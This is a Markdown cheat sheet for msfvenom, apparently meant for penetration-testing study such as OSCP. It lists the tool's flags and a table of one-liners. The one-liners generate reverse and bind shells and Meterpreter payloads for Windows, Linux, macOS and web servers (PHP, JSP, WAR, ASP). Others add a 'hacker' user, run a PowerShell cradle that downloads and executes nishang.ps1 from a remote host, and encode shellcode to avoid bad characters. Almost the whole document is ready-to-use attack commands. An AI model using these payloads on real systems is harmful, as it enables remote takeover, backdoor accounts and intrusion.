## msfvenom

### Installation

Install metasploit.

### Usage

```bash
msfvenom [options] <var=val>
```

### Flags

```bash
-l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
-p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
    --list-options               List --payload <value>'s standard, advanced and evasion options
-f, --format          <format>   Output format (use --list formats to list)
-e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
    --service-name    <value>    The service name to use when generating a service binary
    --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
    --smallest                   Generate the smallest possible payload using all available encoders
    --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
    --encrypt-key     <value>    A key to be used for --encrypt
    --encrypt-iv      <value>    An initialization vector for --encrypt
-a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
    --platform        <platform> The platform for --payload (use --list platforms to list)
-o, --out             <path>     Save the payload to a file
-b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
-n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
    --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
-s, --space           <length>   The maximum size of the resulting payload
    --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
-i, --iterations      <count>    The number of times to encode the payload
-c, --add-code        <path>     Specify an additional win32 shellcode file to include
-x, --template        <path>     Specify a custom executable file to use as a template
-k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
-v, --var-name        <value>    Specify a custom variable name to use for certain output formats
-t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
-h, --help                       Show this message
```

### Examples

| MSFVenom Payload Generation One-Liner                                                                                                                                                                                     | Description                                     |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| `msfvenom -l payloads`                                                                                                                                                                                                    | List available payloads                         |
| `msfvenom -p PAYLOAD --list-options`                                                                                                                                                                                      | List payload options                            |
| `msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP`                                                                                                                                                       | Payload Encoding                                |
| `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf`                                                                                                                                    | Linux Meterpreter reverse shell x86 multi stage |
| `msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf`                                                                                                                                       | Linux Meterpreter bind shell x86 multi stage    |
| `msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf`                                                                                                                                             | Linux bind shell x64 single stage               |
| `msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf`                                                                                                                                          | Linux reverse shell x64 single stage            |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe`                                                                                                                                      | Windows Meterpreter reverse shell               |
| `msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe` | Windows Meterpreter http reverse shell          |
| `msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe`                                                                                                                                        | Windows Meterpreter bind shell                  |
| `msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe`                                                                                                                                            | Windows CMD Multi Stage                         |
| `msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe`                                                                                                                                            | Windows CMD Single Stage                        |
| `msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe`                                                                                                                                              | Windows add user                                |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho`                                                                                                                                        | Mac Reverse Shell                               |
| `msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho`                                                                                                                                           | Mac Bind shell                                  |
| `msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py`                                                                                                                                               | Python Shell                                    |
| `msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh`                                                                                                                                                 | BASH Shell                                      |
| `msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl`                                                                                                                                                 | PERL Shell                                      |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp`                                                                                                                                      | ASP Meterpreter shell                           |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp`                                                                                                                                           | JSP Shell                                       |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war`                                                                                                                                           | WAR Shell                                       |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`                                            | Php Meterpreter Shell                           |
| `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php`                                                                                                                                            | Php Reverse Shell                               |
| `msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \\"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python`                                                                | Windows Exec Nishang Powershell in python       |
| `msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"`                                                                                                     | Bad characters shikata_ga_nai                   |
| `msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"`                                                                                                        | Bad characters fnstenv_mov                      |

# See Also

- https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675
- https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/
- http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
